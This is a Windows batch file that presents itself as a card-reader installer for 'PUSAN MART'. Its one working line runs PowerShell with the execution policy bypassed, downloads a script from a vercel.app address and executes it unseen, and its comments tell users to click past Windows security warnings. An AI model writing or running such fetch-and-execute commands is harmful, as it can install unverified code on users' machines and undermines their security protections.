@echo off
rem PUSAN MART card reader: double-click installer for Windows.
rem Download this file, then double-click it. If Windows warns, choose "More info" then "Run anyway".
rem This avoids pasting a long line into Win+R. It still needs PowerShell to be allowed on this PC;
rem if PowerShell is blocked by policy or antivirus, only this PC's administrator can allow it.
title PUSAN MART card reader - install
echo.
echo   PUSAN MART card reader: installing...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol='Tls12';$b='https://smeag-estore.vercel.app/bridge';irm $b/install.ps1|iex"
if errorlevel 1 (
  echo.
  echo   Could not install. PowerShell may be blocked on this PC.
  echo   Ask this PC's administrator to allow PowerShell, or sign in with an administrator account.
)
echo.
echo   Done. You can close this window.
echo.
pause
